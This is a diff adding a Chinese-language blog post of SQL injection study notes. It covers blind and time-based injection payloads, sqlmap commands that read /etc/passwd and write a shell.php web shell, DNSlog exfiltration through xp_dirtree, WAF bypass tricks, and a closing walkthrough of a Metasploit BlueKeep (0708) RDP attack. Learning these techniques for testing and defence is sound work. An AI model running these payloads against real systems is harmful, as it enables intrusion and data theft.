@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content>
+  <meta name="author" content="John Doe">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="sql注入总结">
+  <meta property="og:description" content>
+  <meta property="og:site_name" content="Taylor">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="http://yoursite.com">
+  
+    <link rel="alternate" href="/atom.xml" title="Taylor" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>Taylor</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.light.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">sql注入总结</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/<your-github-username>">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:<your-email-address>">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By John Doe</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2019-09-09</span>
+            <span class="time">17:43:24</span>
+          </span>
+          
+        </div>
+        <!-- Tags -->
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p><strong>Sql注入总结</strong></p>
+<p><strong>Sql注入原理</strong></p>
+<p>Web应用向后台数据库传递 语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理。那么攻击者就可以构造一些特殊语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p>
+<p><strong>Sql注入漏洞的本质</strong>：把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则。</p>
+<p><strong>SQL注入漏洞的两个关键条件</strong>：用户能控制输入的内容，web应用把用户输入的内用带到数据库中执行</p>
+<p><strong>注入根据请求方式可分为</strong>GET、POST、和请求头注入</p>
+<p><strong>根据注入点的参数</strong>可分为整数型和字符型注入</p>
+<p><strong>任何位置字段的数据只要可以提交到数据库中都有可能存在注入！！！</strong></p>
+<p><strong>判断注入的提交方式：</strong>Select * from news where  id= ‘1’ #  ‘ 报错   加注释还原 字符型</p>
+<p>Select * from news where  id= 1+/-1 是否还原 不还原是字符型 </p>
+<p><strong>测试是否有注入：</strong>‘、‘）、’））、“、”）、“））、 2-1……</p>
+<p><strong>注释方式</strong> # 、 –+、….</p>
+<p>如果网页页面消失，不能代表网站有注入</p>
+<p><strong>根据注入点反馈类型可以分为：</strong>基于错误显示、union类型、布尔类型、基于时间、多语句以及内联注入方式。</p>
+<p>万能密码</p>
+<img src="https://s2.ax1x.com/2019/09/10/nUGYPH.png" alt="nUGYPH.png" border="0">
+
+<p><strong>Union select注入：</strong>判断注入类型、order by 判断字段数、在字段可显示位输入sql语法，</p>
+<p>可先使用基本SQL函数测试是否正常，再逐个判断数据库、表、列名</p>
+<p><strong>报错注入：在报错显示处显示所要的信息 部分代码部分数据库不可使用</strong></p>
+<p><a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a></p>
+<p><strong>布尔盲注：</strong>Select ascii（“ ’ ”）显示单引号的10进制   ASCII码   char(‘’) 查询引号内字符的ascii码</p>
+<p>Select substr （‘hello’，2，3）从第二位开始截取三位</p>
+<p>Select Mid 和上面的一样</p>
+<p>Select length（‘hello’）查询字符长度</p>
+<p>Select count（*）from mysql.user; 查询结果的行数</p>
+<p>Select distinct (*) from mysql.user 去重</p>
+<p>Concat 把列组合到一起   gruop-concat 所有列变成一列 字符串</p>
+<p>1.判断是否存在注入，注入是字符型还是数字型，例：1 or 1=1，1’ or ‘1’=’1</p>
+<p>2.猜解当前数据库名，例：猜长度 and length(database())=1 #，逐个猜字符and ascii(substr(databse(),1,1))&gt;97#</p>
+<p>3.猜解数据库中的表名，例：猜表数量  and (select count (table_name) from information_schema.tables where table_schema=database())=1 #，逐个猜表名长度and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #，再逐个猜表名字符 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 #</p>
+<p>4.猜解表中的字段名，例：猜字段数量and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 #，逐个猜字段长度and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 #，再逐个猜字段字符（可用二分法）</p>
+<p>5.猜解数据，先猜数据记录数（可用二分法），再逐个字段猜数据的长度及数据（可用二分法）</p>
+<p><strong>基于时间的布尔盲注：（对于没有任何输出可作为判断依据的可采用此法，感觉到有明显延迟，则说明猜中）</strong></p>
+<p>sleep( 5 ) 五秒钟之后显示结果</p>
+<p>Select if（1=1，1，0）如果第一个成立，输出第二个，不成立输出第三个</p>
+<p>Select case 1 when 2 then 3 else 4 end  1=2输出3否则输出4</p>
+<img src="https://s2.ax1x.com/2019/09/10/nUJ70f.png" alt="nUJ70f.png" border="0"> 
+
+<p>1.判断是否存在注入，注入是字符型还是数字型，例：and sleep(5) #</p>
+<p>2.猜解当前数据库名，例：猜长度 and if(length(database())=1,sleep(5),1) # ，逐个猜字符 and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)</p>
+<p>3.猜解数据库中的表名，例：猜表数量 and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)#，逐个猜表名长度 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1)，再逐个猜表名字符 </p>
+<p>4.猜解表中的字段名，例：猜字段数量 and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)#，逐个猜字段长度 and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # ，再逐个猜字段字符（可用二分法）</p>
+<p><strong>防sql字符串注入函数</strong>  addslashes()  过滤关键字符</p>
+<p><strong>Sqlmap基本应用：</strong>sqlmap -u url 参数 –dbs -D –table -T –column -C –dump</p>
+<p>–file-read = “/etc/passwd”</p>
+<p>–file-write=”shell.php” –file-dest “/tmp/shell.php”</p>
+<p><strong>宽字节注入</strong></p>
+<p>1,uft-8 除了ascii编码外 每个字符使用三个编码</p>
+<p>Gb2312 gbk 使用两个编码</p>
+<p>2 编码不能编码就是乱码  </p>
+<p>使\ ‘%5c%27与%fd 组合成一个宽字符‘運’</p>
+<p>无法使用内联注入</p>
+<p>SQLmap  指定前后缀</p>
+<img src="https://s2.ax1x.com/2019/09/10/nUJOhQ.png" alt="nUJOhQ.png" border="0"> 
+
+<img src="https://s2.ax1x.com/2019/09/10/nUYC7T.png" alt="nUYC7T.png" border="0"> 
+
+
+
+<p>指定脚本 !<img src="https://s2.ax1x.com/2019/09/10/nUJv1s.png" alt="nUJv1s.png" border="0"></p>
+<p>防止宽字节注入  10行与24行一起使用 </p>
+<img src="https://s2.ax1x.com/2019/09/10/nUYiAU.png" alt="nUYiAU.png" border="0"> 
+
+
+
+<p><strong>二次编码</strong></p>
+<img src="https://s2.ax1x.com/2019/09/10/nUYQAO.png" alt="nUYQAO.png" border="0"> 
+
+<p>有特殊意义的都会先被编码再发送到服务器，服务器收到后会先解码一次，</p>
+<p>把编码后的字符在编码一次 ，urledeonde就不会把字符注释掉 在防注入函数后解码</p>
+<p>Urldecode() 把数据进行解码 解到不能解为止</p>
+<img src="https://s2.ax1x.com/2019/09/10/nUYaHf.png" alt="nUYaHf.png" border="0"> 
+
+<p>可配合burp suite </p>
+<img src="https://s2.ax1x.com/2019/09/10/nUYygs.png" alt="nUYygs.png" border="0"> 
+
+<img src="https://s2.ax1x.com/2019/09/10/nUYhUU.png" alt="nUYhUU.png" border="0"> 
+
+<p>–levle 设置等级 –cookie 设置cookie值</p>
+<p>文件上传注入</p>
+<img src="https://s2.ax1x.com/2019/09/10/nUYT29.png" alt="nUYT29.png" border="0"> 
+
+
+
+<p><strong>二次注入</strong></p>
+<p>abc’数据经过addslashes过滤，单引号前面添加反斜杠abc\’</p>
+<p>但传入到数据库的数据还是abc’</p>
+<p><strong>Access数据库注入</strong></p>
+<p>Select 1,2,3,4,5, from <code>table_name</code>     union select 1,2,3,4,5 from <code>table_name</code></p>
+<p>查找信息需带上表名</p>
+<p>判断是那种数据库</p>
+<p>and (select count(*) from MSysAccessObjects)&gt;0 返回正常说明是access</p>
+<p>and (select count(*) from sysobjects) &gt;0 返回正常说明是mssql</p>
+<p>没有库 只有表  没有注释 只能使用盲注、联合查询</p>
+<p>Access数据库 select top 1 <em>from news;  显示第一条  top *  显示</em>条</p>
+<p> 但只显示一条数据</p>
+<p>select top 1 * from (Select top 2 id ,title from news) order by id desc;  // 逆序排序 取第一个值</p>
+<p><strong>Mssql注入</strong></p>
+<p>使用top查询指定字段</p>
+<p>db_name 当前数据库名字</p>
+<p>Master..sysdatabases 存储了所有的数据库名</p>
+<p>Information_schema.tables 只存储当前的数据库名</p>
+<p>Master..sysobjects 查询表名</p>
+<p>SELECT table_name FROM information_schema.tables FOR XML PATH(‘’)</p>
+<p>列出数据</p>
+<p>Waitfor  delay  ‘0:0:0’; 指定等待多长时间</p>
+<p>Waitfor  time  ‘10:30:55’ 指定时间执行任务</p>
+<img src="https://s2.ax1x.com/2019/09/10/nUYjUO.png" alt="nUYjUO.png" border="0"> 
+
+<p>多语句时间延时盲注</p>
+<p>Mssql的dnslog外带数据</p>
+<img src="https://s2.ax1x.com/2019/09/10/nUtS8H.png" alt="nUtS8H.png" border="0"> 
+
+<img src="https://s2.ax1x.com/2019/09/10/nUtPKI.png" alt="nUtPKI.png" border="0"> 
+
+<p>使用xp_dirtree</p>
+<p>先定义一个变量和长度，再赋值给变量，查询当前数据库</p>
+<p>xp_fileexist和xp_subdirs的用法与xp_dirtree的用法几乎相同</p>
+<p>MySQL外带数据</p>
+<p>先添加   后重启</p>
+<img src="https://s2.ax1x.com/2019/09/10/nUNkl9.png" alt="nUNkl9.png" border="0"> 
+
+<p>使用数据库输入路径时需多加一个\防止转义</p>
+<p><img src="https://s2.ax1x.com/2019/09/10/nUNmTK.png" alt="nUNmTK.png" border="0"><img src="https://s2.ax1x.com/2019/09/10/nUNKYD.png" alt="nUNKYD.png" border="0"> </p>
+<p>Waf介绍</p>
+<p><img src="https://s2.ax1x.com/2019/09/10/nUN36A.png" alt="nUN36A.png" border="0"><img src="https://s2.ax1x.com/2019/09/10/nUNdfg.png" alt="nUNdfg.png" border="0"><img src="https://s2.ax1x.com/2019/09/10/nUND6s.png" alt="nUND6s.png" border="0"> </p>
+<p>攻击网站会被拉入黑名单</p>
+<p><strong>绕waf</strong> </p>
+<p>字符大小写（基本不管用）</p>
+<p><img src="https://s2.ax1x.com/2019/09/10/nUNj9e.png" alt="nUNj9e.png" border="0">关键字禁用</p>
+<p><img src="https://s2.ax1x.com/2019/09/10/nUNOhD.png" alt="nUNOhD.png" border="0"> 如果替换成空 可以在字符中再插入一遍字符    如果替换成其他字符 不可以</p>
+<p>常见注释符 //、– 、/**/、–+ 、– - 、; 、–a</p>
+<p>Select/<em>*/123 =&gt;select 123  =&gt;  /</em>!select*/123( mysql支持) </p>
+<p>利用tab  （编码%09）或/**/ （%20）代替空格</p>
+<img src="https://s2.ax1x.com/2019/09/10/nUUpnI.png" alt="nUUpnI.png" border="0"> 
+
+<p><img src="https://s2.ax1x.com/2019/09/10/nUUCHP.png" alt="nUUCHP.png" border="0"><img src="https://s2.ax1x.com/2019/09/10/nUUiAf.png" alt="nUUiAf.png" border="0"> </p>
+<p><img src="https://s2.ax1x.com/2019/09/10/nUUV3Q.png" alt="nUUV3Q.png" border="0"><img src="https://s2.ax1x.com/2019/09/10/nUUejs.png" alt="nUUejs.png" border="0"><img src="https://s2.ax1x.com/2019/09/10/nUUuBq.png" alt="nUUuBq.png" border="0"><img src="https://s2.ax1x.com/2019/09/10/nUUQEV.png" alt="nUUQEV.png" border="0"> </p>
+<p>漏洞机ip地址</p>
+<img src="https://s2.ax1x.com/2019/09/10/nUU14U.png" alt="nUU14U.png" border="0"> 
+
+<p>打开远程桌面 无杀毒软件</p>
+<img src="https://s2.ax1x.com/2019/09/10/nUUG34.png" alt="nUUG34.png" border="0"> 
+
+<p>使用kali工具metasploit 启用 0708rdp模块 设置受害机ip 端口号 机器架构 开始攻击</p>
+<img src="https://s2.ax1x.com/2019/09/10/nUUUD1.png" alt="nUUUD1.png" border="0"> 
+
+<p>连接后使用win命令是否成功</p>
+<img src="https://s2.ax1x.com/2019/09/10/nUU0UK.png" alt="nUU0UK.png" border="0">
+
+<img src="https://s2.ax1x.com/2019/09/10/nUU6vd.png" alt="nUU6vd.png" border="0"> 
+
+<p>成功</p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
